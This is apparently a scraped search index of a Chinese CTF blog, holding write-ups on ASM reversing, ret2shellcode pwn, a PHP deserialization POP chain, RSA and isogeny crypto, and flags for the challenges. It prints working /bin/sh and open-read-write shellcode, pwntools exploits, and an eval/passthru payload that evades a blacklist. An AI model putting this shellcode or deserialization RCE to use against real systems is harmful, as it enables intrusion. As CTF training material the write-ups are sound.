SystemExit(3)q = n // pprint(&quot;\\nRecovered p =&quot;, p)print(&quot;Recovered q =&quot;, q)phi = (p-1)*(q-1)d = inverse(e, phi)m = pow(c, d, n)try: flag = long_to_bytes(m) print(&quot;\\nflag (bytes):&quot;, flag) try: print(&quot;flag (utf-8):&quot;, flag.decode()) except: passexcept Exception as exc: print(&quot;转换为 bytes 失败，m 的值:&quot;, m) raise# flag: ISCTF&#123;M0dIFi3D_f3RM47_7H30r3m_I5_fUn_8U7_h4rD3r!&#125;","categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"比赛个人WP","slug":"比赛个人WP","permalink":"https://incldue.github.io/tags/%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BAWP/"}]},{"title":"Re练习之ASM汇编逆向","slug":"Re练习之ASM汇编逆向","date":"2025-11-06T16:00:00.000Z","updated":"2025-11-07T16:29:44.663Z","comments":true,"path":"2025/11/07/Re练习之ASM汇编逆向/","permalink":"https://incldue.github.io/2025/11/07/Re%E7%BB%83%E4%B9%A0%E4%B9%8BASM%E6%B1%87%E7%BC%96%E9%80%86%E5%90%91/","excerpt":"关于Reverse中ASM汇编的一些介绍以及例题讲解","text":"基本介绍以一个耳熟能详的Hello World程序切入： #include &lt;stdio.h&gt;int main(int argc, char* argv []) &#123; printf(&quot;Hello, world!\\n&quot;); return 0; &#125; 通过gcc编译为ASM形式并输出得到： .section .rodata.LC0: .string &quot;Hello, world!&quot; .text .globl main .type main, @functionmain: push rbp mov rbp, rsp sub rsp, 16 mov DWORD PTR [rbp-4], edi //字符串值赋给edi mov QWORD PTR [rbp-16], rsi mov edi, OFFSET FLAT:.LC0 //传参完毕 call puts //调用printf函数，输出字符串 mov eax, 0 //eax赋值为0，作为函数返回值 leave ret 过程很简单， 首先的.LC0定义了前面的Hello World!字符串，告诉编译器该字符串的地址。 下面的则是main函数的汇编块： 第8-12行为初始化堆栈，开辟适合的内存区域，而rbp、rsp、edi则是寄存器，负责储存数据。 13行后都是执行函数。 常见的汇编指令：mov、sub、call、ret等。 mov：赋值。格式为mov 被赋值方 要赋的值； sub：递减。 call：调用。 ret&amp;leave：出栈。代表一个函数的结束。(通常在wasm中leave不常见) 常见指令1.loop循环指令：mov rax,0mov rcx,236s:add rax,123loop sleaveret 以上执行的便是对123累加236次。在上述代码中，rcx寄存器保存循环次数；loop指令每执行一次，rcx -1。 2.无条件跳转指令：lable:mov edx,0jmp lable 上述的jmp即为无条件跳转。 3.条件跳转指令：lable:mov edx,1cmp ebx,0je lable 上述代码将ebx的值与0对比：为真，跳转至lable，所以je为条件跳转关键词。 一般的条件跳转指令与cmp、test指令混在一起用： lable:mov edx,1test ebx,0jnz lable //代表标志位为0则跳转 常见的条件跳转指令： je：等于(Jump if Equal ) jne：不等于(Jump if Not Equal) jz：零标志位为1(Jump if Zero) jnz：零标志位为0(Jump if Not Zero) js：符号标志位为1(Jump if Sign) jns：符号标志位为0(Jump if Not Sign) jp或jpe：奇偶标志位为1 jnp或jpo：奇偶标志位为0 jo：溢出标志位为1 jno：溢出标志位为0 jg或jnle：大于 jge或jnl：大于&#x2F;等于 JL或JNGE：小于 JLE或JNG：小于&#x2F;等于 常见的位运算指令： AND：与运算。AND AX, BX，即AX与BX进行逻辑与运算，保存结果至AX OR：或运算。OR AX, BX，即AX与BX进行逻辑或运算，保存结果至AX XOR：异或运算。XOR AX, BX，即异或运算，保存结果至AX NOT：取反操作。NOT CX，将CX取反，保存结果至CX中 4.函数传参：通常函数の返回值保存在ax寄存器(eax、rax) 参数一般按顺序保存在cx、dx、si中 在64位汇编当中，则按照rcx、rdx、r8、r9、r10、r11 ...顺序储存 5.lea地址加载：格式为lea rdx, [my_var]，将my_var地址赋值给rdx寄存器。 6.xchg数值交换：格式为xchg ax, bx，将ax与bx的数值交换 例题一.[HDCTF 2023]easy_asmIDA打开附件，只有一个start函数，空格切换至汇编代码： 和 很容易看到，待解密的flag就是seg001的内容， 圈出来的便是xor加密逻辑：al存储seg001的值，cl存储异或的key &quot;0x10&quot;。 要想解密，就得异或回去，seg001 ^0x10 = decrypt_flag 最终的exp： enc_flag = [ 0x4E, 0x6F, 0x74, 0x20, 0x65, 0x71, 0x75, 0x61, 0x6C, 0x21, 0x24, 0x45, 0x71, 0x75, 0x61, 0x6C, 0x21, 0x24, 0x58, 0x54, 0x53, 0x44, 0x56, 0x6B, 0x5A, 0x65, 0x63, 0x64, 0x4F, 0x71, 0x4F, 0x75, 0x23, 0x63, 0x69, 0x4F, 0x71, 0x43, 0x7D, 0x6D, 0x24]decrypt_flag = &#x27;&#x27;.join([chr(b ^ 0x10) for b in enc_flag])print(decrypt_flag)#flag: HDCTF&#123;Just_a_e3sy_aSm&#125; 暂时只做了这一道asm逆向的，之后有做到会接着补充，嗯~ o(￣▽￣)o","categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"CTF基础知识","slug":"CTF基础知识","permalink":"https://incldue.github.io/tags/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"日常练习","slug":"日常练习","permalink":"https://incldue.github.io/tags/%E6%97%A5%E5%B8%B8%E7%BB%83%E4%B9%A0/"},{"name":"Reverse","slug":"Reverse","permalink":"https://incldue.github.io/tags/Reverse/"}]},{"title":"PWN练习之ret2shellcode","slug":"PWN练习之ret2shellcode","date":"2025-11-04T16:00:00.000Z","updated":"2025-11-07T16:28:39.803Z","comments":true,"path":"2025/11/05/PWN练习之ret2shellcode/","permalink":"https://incldue.github.io/2025/11/05/PWN%E7%BB%83%E4%B9%A0%E4%B9%8Bret2shellcode/","excerpt":"关于pwn栈溢出中三大类之一的ret3shellcode的介绍以及例题讲解","text":"概述ret2shellcode是栈溢出利用ret2text、ret2shellcode、ret2libc三大类中的一个，是指攻击者需要在程序没给shell的情况下自己调用shell的机器码(即shellcode)注入到程序内存中，随后就是利用栈溢出复写return_address，跳转至shellcode所在内存，执行shell命令，得到flag。 可能的exp姿势1.注入shellcode至stack段中这个现在其实很少见了，基本上都加了保护。其中，比较常见的保护手段有： ASLR：其功能是将一部分内存段(如栈…)的地址偏移，在注入时难以定位其位置。 NX：使得部分内存段(如堆、栈…) 不可执行，无法执行注入的代码。 Canary：原理是在栈底插入cookie信息，函数返回时将检测该信息是否被改变，若改变，则断定发生栈溢出 2.注入shellcode至bss段中在虚拟内存当中，bss段主要保存无初值的全局变量&#x2F;静态变量(在assmbly中以占位符？声明)。若程序的bss段可写、可执行，则可以把shellcode写入全局变量&#x2F;静态变量中。 例题一.[GDOUCTF 2023]Shellcode拿到二进制文件，习惯性的checksec一下，看栈…的保护措施： 加了NX，不过没啥关系， 放到IDA中反编译，定位到main函数： &#123; _BYTE buf[10]; // [rsp+6h] [rbp-Ah] BYREF setbuf(stdin, 0LL); setbuf(stderr, 0LL); setbuf(stdout, 0LL); mprotect((void *)((unsigned __int64)&amp;stdout &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7); puts(&quot;Please.&quot;); read(0, &amp;name, 0x25uLL); puts(&quot;Nice to meet you.&quot;); puts(&quot;Let&#x27;s start!&quot;); read(0, buf, 0x40uLL); return 0;&#125; 可以利用name来注入shellcode，然后再栈溢出到buf中执行。这里要注意的是name限制了25字节的写入。 想到利用pwntools里的shellcraft模块直接生成shellcode利用， 首先试试用shellcraft.sh()，但是这个在32位下占位44字节，64位的则为48字节，超过了25字节的写入限制。于是，便利用shellcraft.cat()来构造cat flag，这个只有0x21字节。 接着，我们得到name的地址为.bss段的0x6010A0。 最后的exp： from pwn import *context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)io = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28409)shellcode = asm(shellcraft.cat(&quot;flag&quot;))io.sendlineafter(b&#x27;Please.&#x27;, shellcode)io.sendlineafter(b&#x27;start!&#x27;, b&#x27;a&#x27;*0x12 + p64(0x6010A0))io.interactive()#flag:NSSCTF&#123;d7640236-bc9b-4954-a10a-2bfd305e91a8&#125; 还有一种做法是手动构造shellcode，找一个小于25字节的shellcode。 NOTE 32位短字节shellcode(21字节)： \\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80 64位短字节shellcode(23字节)： \\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f \\x05 其余的基本上不变，下面为第二种exp： from pwn import *context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)io = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28409)shellcode = &quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&quot;io.sendlineafter(b&#x27;Please.&#x27;, shellcode)io.sendlineafter(b&#x27;start!&#x27;, b&#x27;a&#x27;*0x12 + p64(0x6010A0))io.interactive()#flag:NSSCTF&#123;d7640236-bc9b-4954-a10a-2bfd305e91a8&#125; 二.[HNCTF 2022 Week1]safe_shellcode拿到附件，checksec一下， 保护得还算少， IDA中反编译，定位main函数： &#123; size_t v3; // rbx char s[524]; // [rsp+0h] [rbp-220h] BYREF int i; // [rsp+20Ch] [rbp-14h] setbuf(stdin, 0LL); setbuf(stderr, 0LL); setbuf(stdout, 0LL); mprotect((void *)((unsigned __int64)&amp;stdout &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7); memset(s, 0, 0x200uLL); read(0, s, 0x300uLL); for ( i = 0; ; ++i ) &#123; v3 = i; if ( v3 &gt;= strlen(s) ) break; if ( s[i] &lt;= 47 || s[i] &gt; 122 ) &#123; puts(&quot;Hacker!!!&quot;); exit(0); &#125; &#125; strcpy(buff, s); (*(void (**)(void))buff)(); return 0;&#125; 就是先read一下s变量，循环s字节数的次数做判断，strcpy(buff, s)则是将s的值直接存入buff中，其也指向了.bss段。 要想绕过该判断，只要输入的ascii码在47-122之间即可。09、AZ、a~z都可。 我们使用纯ascii字符的shellcode：Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t 因为后面直接调用了buff的地址，所以无须栈溢出即可得到flag。 NOTE 32位 短字节shellcode –&gt; 21字节 \\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80 32位 纯ascii字符shellcode PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA 32位 scanf可读取的shellcode \\xeb\\x1b\\x5e\\x89\\xf3\\x89\\xf7\\x83\\xc7\\x07\\x29\\xc0\\xaa\\x89\\xf9\\x89\\xf0\\xab\\x89\\xfa\\x29\\xc0\\xab\\xb0\\x08\\x04\\x03\\xcd\\x80\\xe8\\xe0\\xff\\xff\\xff&#x2F;bin&#x2F;sh 64位 scanf可读取的shellcode 22字节 \\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05 64位 较短的shellcode 23字节 \\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05 64位 纯ascii字符shellcode Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t 最后的exp： from pwn import *context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)io = remote(&#x27;node5.anna.nssctf.cn&#x27;, 26988)shellcode = &quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;io.send(shellcode)io.interactive()#flag:nssctf&#123;W0www!!!!!!!!!!!Sh311C0d3_m@st3rrr!!&#125; 绕过限制一.限制输入长度 利用短字节shellcode(32位) getshell - 21字节 # (execve(&quot;/bin/sh&quot;,NULL,NULL))shellcode = asm(&quot;&quot;&quot; push 0x68732f push 0x6e69622f mov ebx,esp xor ecx,ecx xor edx,edx push 11 pop eax int 0x80&quot;&quot;&quot;) orw - 56字节 shellcode = asm(&quot;&quot;&quot; /*open(./flag)*/ push 0x1010101 xor dword ptr [esp], 0x1016660 push 0x6c662f2e mov eax,0x5 mov ebx,esp xor ecx,ecx int 0x80 /*read(fd,buf,0x100)*/ mov ebx,eax mov ecx,esp mov edx,0x30 mov eax,0x3 int 0x80 /*write(1,buf,0x100)*/ mov ebx,0x1 mov eax,0x4 int 0x80&quot;&quot;&quot;) 无\\x00截断getshell - 21字节 \\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80 scanf可读取getshell - 41字节 \\xeb\\x1b\\x5e\\x89\\xf3\\x89\\xf7\\x83\\xc7\\x07\\x29\\xc0\\xaa\\x89\\xf9\\x89\\xf0\\xab\\x89\\xfa\\x29\\xc0\\xab\\xb0\\x08\\x04\\x03\\xcd\\x80\\xe8\\xe0\\xff\\xff\\xff/bin/sh 利用短字节shellcode(64位) getshell - 22字节 shellcode = asm(&quot;&quot;&quot; mov rbx, 0x68732f6e69622f push rbx push rsp pop rdi xor esi,esi xor edx,edx push 0x3b pop rax syscall&quot;&quot;&quot;) orw - 43字节 shellcode = asm(&quot;&quot;&quot; push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall mov edi,1 mov rsi,rsp push 1 pop rax syscall&quot;&quot;&quot;) 无\\x00截断、scanf可读 - 22字节 \\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05 \\x00截断绕过长度判断 当题目采用strlen来进行shellcode的长度检测时，可以在其前面加\\x00开头的指令绕过长度检测。以下为64位的指令： 00 40 00 add BYTE PTR [rax+0x0], al00 41 00 add BYTE PTR [rcx+0x0], al00 42 00 add BYTE PTR [rdx+0x0], al00 43 00 add BYTE PTR [rbx+0x0], al00 45 00 add BYTE PTR [rbp+0x0], al00 46 00 add BYTE PTR [rsi+0x0], al00 47 00 add BYTE PTR [rdi+0x0], al ps:也可直接\\x00\\x00绕过 二.限制权限 限制shellcode无读写权限 利用mprotect给予读写权限，并再次利用read写入执行 mprotect用法#include &lt;unistd.h&gt;#include &lt;sys/mmap.h&gt;int mprotect(const void *start, size_t len, int prot); 限制远程读flag权限 先执行setuid(0)，再执行execve来进行getshell。","categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"CTF基础知识","slug":"CTF基础知识","permalink":"https://incldue.github.io/tags/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"pwn","slug":"pwn","permalink":"https://incldue.github.io/tags/pwn/"},{"name":"日常练习","slug":"日常练习","permalink":"https://incldue.github.io/tags/%E6%97%A5%E5%B8%B8%E7%BB%83%E4%B9%A0/"}]},{"title":"?CTF2025 week4部分WP","slug":"ilovectf week4 部分WP","date":"2025-10-31T16:00:00.000Z","updated":"2025-11-01T06:09:00.482Z","comments":true,"path":"2025/11/01/ilovectf week4 部分WP/","permalink":"https://incldue.github.io/2025/11/01/ilovectf%20week4%20%E9%83%A8%E5%88%86WP/","excerpt":"打了?CTF2025,拿了第47，遗憾离场~","text":"WEB[Week4] Path to Hero 题目描述：初出茅庐的勇者啊，你能战胜魔王，得到至宝吗？ 打开靶机，观察前端显示： &lt;?phphighlight_file(&#x27;index.php&#x27;);Class Start&#123; public $ishero; public $adventure; public function __wakeup()&#123; if (strpos($this-&gt;ishero, &quot;hero&quot;) !== false &amp;&amp; $this-&gt;ishero !== &quot;hero&quot;) &#123; echo &quot;&lt;br&gt;勇者啊，去寻找利刃吧&lt;br&gt;&quot;; return $this-&gt;adventure-&gt;sword; &#125; else&#123; echo &quot;前方的区域以后再来探索吧！&lt;br&gt;&quot;; &#125; &#125;&#125;class Sword //MD5弱类型比较&#123; public $test1; public $test2; public $go; public function __get($name) &#123; if ($this-&gt;test1 !== $this-&gt;test2 &amp;&amp; md5($this-&gt;test1) == md5($this-&gt;test2)) &#123; echo &quot;沉睡的利刃被你唤醒了，是时候去讨伐魔王了！&lt;br&gt;&quot;; echo $this-&gt;go; &#125; else &#123; echo &quot;Dead&quot;; &#125; &#125;&#125;class Mon3tr&#123; private $result; public $end; public function __toString() &#123; $result = new Treasure(); echo &quot;到此为止了！魔王&lt;br&gt;&quot;; if (!preg_match(&quot;/^cat|flag|tac|system|ls|head|tail|more|less|nl|sort|find?/i&quot;, $this-&gt;end)) &#123; $result-&gt;end($this-&gt;end); &#125; else &#123; echo &quot;难道……要输了吗？&lt;br&gt;&quot;; &#125; return &quot;&lt;br&gt;&quot;; &#125;&#125;class Treasure&#123; public function __call($name, $arg) &#123; echo &quot;结束了？&lt;br&gt;&quot;; eval($arg[0]); &#125;&#125;if (isset($_POST[&quot;HERO&quot;])) &#123; unserialize($_POST[&quot;HERO&quot;]);&#125; 看到关键词unserialize以及魔术方法_wakeup()、_toString()得知，考察PHP的ROP链反序列化， 第一个类Start，我们让$adventrue为一个Sword对象； 第二个类Sword是典型的MD5弱类型比较(==比较哈希值)，我们只需让$a = 240610708 &amp; $b = QNKCDZO，MD5的值因为都以0e开头，被科学计数法处理为0，相等； 第三个类Mon3tr考察黑名单绕过(正则过滤の绕过)，可以使用base64编码绕过； 第四个类Treasure则考察RCE，任意代码执行。 构造payload： &lt;?phpclass Start&#123; public $ishero; public $adventure;&#125;class Sword&#123; public $test1; public $test2; public $go;&#125;class Mon3tr&#123; public $end;&#125;class Treasure&#123; public function __call($name, $arg) &#123; eval($arg[0]); &#125;&#125;$mon3tr = new Mon3tr();$mon3tr-&gt;end = &quot;print_r(scandir(&#x27;/&#x27;));&quot;;$sword = new Sword();$sword-&gt;test1 = &quot;240610708&quot;;$sword-&gt;test2 = &quot;QNKCDZO&quot;;$sword-&gt;go = $mon3tr;$start = new Start();$start-&gt;ishero = &quot;herox&quot;;$start-&gt;adventure = $sword;echo urlencode(serialize($start));?&gt; 得到：O%3A5%3A%22Start%22%3A2%3A%7Bs%3A6%3A%22ishero%22%3Bs%3A5%3A%22herox%22%3Bs%3A9%3A%22adventure%22%3BO%3A5%3A%22Sword%22%3A3%3A%7Bs%3A5%3A%22test1%22%3Bs%3A9%3A%22240610708%22%3Bs%3A5%3A%22test2%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A2%3A%22go%22%3BO%3A6%3A%22Mon3tr%22%3A1%3A%7Bs%3A3%3A%22end%22%3Bs%3A22%3A%22print_r%28scandir%28%27%2F%27%29%29%3B%22%3B%7D%7D%7D 先调用类似ls /命令查看文件夹，得到： 然后再用eval()函数，再base64编码，改$mon3tr-&gt;end = &quot;print_r(scandir(&#39;/&#39;));&quot;;为$mon3tr-&gt;end = &quot;eval(base64_decode(&#39;cGFzc3RocnUoJ2NhdCAvZmxhZycpOw==&#39;));&quot;;，执行php代码，得到：O%3A5%3A%22Start%22%3A2%3A%7Bs%3A6%3A%22ishero%22%3Bs%3A5%3A%22herox%22%3Bs%3A9%3A%22adventure%22%3BO%3A5%3A%22Sword%22%3A3%3A%7Bs%3A5%3A%22test1%22%3Bs%3A9%3A%22240610708%22%3Bs%3A5%3A%22test2%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A2%3A%22go%22%3BO%3A6%3A%22Mon3tr%22%3A1%3A%7Bs%3A3%3A%22end%22%3Bs%3A56%3A%22eval%28base64_decode%28%27cGFzc3RocnUoJ2NhdCAvZmxhZycpOw%3D%3D%27%29%29%3B%22%3B%7D%7D%7D， POST请求，最终得到flag：flag{e24449c0-752e-42fe-8e9a-cff80fe7e221} Crypto[Week4] Myneighbors 题目描述：我是我的邻居？https://eprint.iacr.org/2019/1321.pdf 题目代码为sagemath格式的： from secret import magical_num, flagfrom Crypto.Util.Padding import padfrom Crypto.Util.number import *from Crypto.Cipher import AESimport hashlib p = 431F.&lt;i&gt; = GF(p^2, modulus = x^2 + 1)E = EllipticCurve(j=F(magical_num))assert E.is_supersingular()P = E(0).division_points(2)[1:]neighbors = []for idx in range(len((P))): phi = E.isogeny(P[idx]) EE = phi.codomain() neighbors.append(EE.j_invariant())assert E.j_invariant() in neighborsP = E(0).division_points(3)[1:]shuffle(P)phi = E.isogeny(P[0])E = phi.codomain()H = hashlib.md5(str(E.j_invariant()).encode()).hexdigest().encode()key, iv = H[:16], H[16:]aes = AES.new(key, AES.MODE_CBC, iv)cipher = aes.encrypt(pad(flag, 16))print(f&#x27;cipher: &#123;cipher.hex()&#125;&#x27;)#cipher: 49e90a91357fef12c54234b3cb553bb2fdd61f2af8c7e78b3d5ffdeac7022af0 可以看到assert E.j_invariant() in neighbors，E的j-invariant在自己的2-isogeny邻居中， 同时，从题目给的文献里得知： 在2-isogeny图中，每个j-invariant通常有3个邻居； 特殊的j-invariant包括p=431时，j 属于&#123;0, 2, 242&#125;和j=0&amp;&amp;j=242时，在图中有自环。 因此，我们的攻击思路为： magical_num必须是有自环的； 尝试j 属于&#123;0, 242&#125;; 枚举所有可能的3-isogeny目标曲线； 对p=431，每个曲线则有4个3-isogeny邻居。 综上，EXP为： from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadimport hashlibp = 431F.&lt;i&gt; = GF(p^2, modulus = x^2 + 1)cipher_hex = &#x27;49e90a91357fef12c54234b3cb553bb2fdd61f2af8c7e78b3d5ffdeac7022af0&#x27;cipher = bytes.fromhex(cipher_hex)candidates = [F(0), F(4), F(242)]for magical_num in candidates: try: E = EllipticCurve(j=magical_num) if not E.is_supersingular(): continue P = E(0).division_points(2)[1:] neighbors = [] for idx in range(len(P)): phi = E.isogeny(P[idx]) EE = phi.codomain() neighbors.append(EE.j_invariant()) if E.j_invariant() not in neighbors: continue print(f&quot;Found magical_num: &#123;magical_num&#125;&quot;) P3 = E(0).division_points(3)[1:] for P_point in P3: try: phi = E.isogeny(P_point) E_new = phi.codomain() j_inv = E_new.j_invariant() H = hashlib.md5(str(j_inv).encode()).hexdigest().encode() key, iv = H[:16], H[16:] aes = AES.new(key, AES.MODE_CBC, iv) try: plaintext = unpad(aes.decrypt(cipher), 16) if b&#x27;flag&#123;&#x27; in plaintext or b&#x27;FLAG&#123;&#x27; in plaintext: print(f&quot;Success with j-invariant: &#123;j_inv&#125;&quot;) print(f&quot;Flag: &#123;plaintext.decode()&#125;&quot;) exit() except: pass except: pass except Exception as e: continueprint(&quot;Flag not found - trying all j-invariants from the paper...&quot;)all_j_invariants = [ F(0), F(4), F(316), F(107), F(419), F(234), F(102), F(241), F(143), F(358), F(125), F(19), F(242), F(61), F(381), F(319), F(356), F(150), F(422), F(67), F(189), F(81*i + 65), F(67*i + 304), F(350*i + 65), F(132*i + 315), F(125*i + 426), F(306*i + 426), F(299*i + 315), F(325*i + 379), F(222*i + 118), F(106*i + 379), F(42*i + 141), F(209*i + 118), F(389*i + 141), F(364*i + 304), F(344*i + 190), F(87*i + 190)]for j_inv in all_j_invariants: H = hashlib.md5(str(j_inv).encode()).hexdigest().encode() key, iv = H[:16], H[16:] aes = AES.new(key, AES.MODE_CBC, iv) try: plaintext = unpad(aes.decrypt(cipher), 16) if b&#x27;flag&#123;&#x27; in plaintext or b&#x27;FLAG&#123;&#x27; in plaintext or plaintext.startswith(b&#x27;flag&#x27;) or plaintext.isascii(): print(f&quot;Found with j-invariant: &#123;j_inv&#125;&quot;) print(f&quot;Flag: &#123;plaintext.decode()&#125;&quot;) break except: pass #flag：flag&#123;I_@m_4_n31gh80r_0f_my53lf&#125;","categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"比赛个人WP","slug":"比赛个人WP","permalink":"https://incldue.github.io/tags/%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BAWP/"}]},{"title":"2025 XAUTCTF新生赛 rev&algo部分WP","slug":"XAUTCTF2025 rev&algo部分WP","date":"2025-10-23T16:16:48.000Z","updated":"2025-10-23T16:27:22.706Z","comments":true,"path":"2025/10/24/XAUTCTF2025 rev&algo部分WP/","permalink":"https://incldue.github.io/2025/10/24/XAUTCTF2025%20rev&algo%E9%83%A8%E5%88%86WP/","excerpt":"今年XAUTCTF新生赛rev&algo部分WP","text":"algoezzz_base 题目描述：欸，这个base怎么有点不一样？？ 打开附件， dict:&#123;0: &#x27;J&#x27;, 1: &#x27;K&#x27;, 2: &#x27;L&#x27;, 3: &#x27;M&#x27;, 4: &#x27;N&#x27;, 5: &#x27;O&#x27;, 6: &#x27;x&#x27;, 7: &#x27;y&#x27;, 8: &#x27;U&#x27;, 9: &#x27;V&#x27;, 10: &#x27;z&#x27;, 11: &#x27;A&#x27;, 12: &#x27;B&#x27;, 13: &#x27;C&#x27;, 14: &#x27;D&#x27;, 15: &#x27;E&#x27;, 16: &#x27;F&#x27;, 17: &#x27;G&#x27;, 18: &#x27;H&#x27;, 19: &#x27;7&#x27;, 20: &#x27;8&#x27;, 21: &#x27;9&#x27;, 22: &#x27;P&#x27;, 23: &#x27;Q&#x27;, 24: &#x27;I&#x27;, 25: &#x27;a&#x27;, 26: &#x27;b&#x27;, 27: &#x27;c&#x27;, 28: &#x27;d&#x27;, 29: &#x27;e&#x27;, 30: &#x27;f&#x27;, 31: &#x27;g&#x27;, 32: &#x27;h&#x27;, 33: &#x27;i&#x27;, 34: &#x27;j&#x27;, 35: &#x27;k&#x27;, 36: &#x27;l&#x27;, 37: &#x27;m&#x27;, 38: &#x27;W&#x27;, 39: &#x27;X&#x27;, 40: &#x27;Y&#x27;, 41: &#x27;Z&#x27;, 42: &#x27;0&#x27;, 43: &#x27;1&#x27;, 44: &#x27;2&#x27;, 45: &#x27;3&#x27;, 46: &#x27;4&#x27;, 47: &#x27;5&#x27;, 48: &#x27;6&#x27;, 49: &#x27;R&#x27;, 50: &#x27;S&#x27;, 51: &#x27;T&#x27;, 52: &#x27;n&#x27;, 53: &#x27;o&#x27;, 54: &#x27;p&#x27;, 55: &#x27;q&#x27;, 56: &#x27;r&#x27;, 57: &#x27;s&#x27;, 58: &#x27;t&#x27;, 59: &#x27;u&#x27;, 60: &#x27;v&#x27;, 61: &#x27;w&#x27;, 62: &#x27;+&#x27;, 63: &#x27;/&#x27;, 64: &#x27;=&#x27;&#125;chipertext:PNO99NC8GX3nHMCgc8KT9x9SQTKxQpUndn9w 通过“&#x3D;”和64个字符，得知是base64编码的一个换表， 重新换表后输入密文解码得到flag：XAUTCTF{tH3_m@sTer_0F_b4sE} e咋不是65537？？？ 题目描述：完了，e不是65537，咋办呢？ 关于RSA的前置知识，建议食用关于CTF-RSA题目类型解题思路 打开附件： from Crypto.Util.number import *m=bytes_to_long(b&#x27;xxxxxx&#x27;)p=getPrime(256)q=getPrime(256)e=74n=p*qc=pow(m,e,n)print(&quot;p=&quot;,p)print(&quot;q=&quot;,q)print(&quot;c=&quot;,c)#p = 86053582917386343422567174764040471033234388106968488834872953625339458483149#q = 72031998384560188060716696553519973198388628004850270102102972862328770104493#c = 331902287503397442396418773991759527842718419738370800180657653090960908650804# 1781233603918453326670975069669017566120311964861589659101428987255146018427 简单的RSA，但与一般的RSA不同的是e为74。 e&#x3D;74&#x3D;2*37，不与phi(n)互素，得使用最大公约数(GCD)来解答，明文m0，密文c，c&#x3D;m0^e (mod n) 令t = gcd(e,phi(n))，使e = t*e&#39;，从而得到gcd(e&#39;,phi(n))=1，重新互素。 计算步骤： 计算t = gcd(e,phi(n)) 令e&#39; = e/t，求d = (e&#39;)^-1 (mod phi(n)) 最后计算m = c^d mod n，也就为最终的明文 EXP： import gmpy2from Crypto.Util.number import *# 当e约去公约数t后与phi(n)互素def decrypt(p, q, e, c): n = p * q phi = (p - 1) * (q - 1) t = gmpy2.gcd(e, phi) d = gmpy2.invert(e // t, phi) m = pow(c, d, n) print(m) msg = gmpy2.iroot(m, t) print(msg) if msg[1]: print(long_to_bytes(msg[0]))e=74p= 86053582917386343422567174764040471033234388106968488834872953625339458483149q= 72031998384560188060716696553519973198388628004850270102102972862328770104493c= 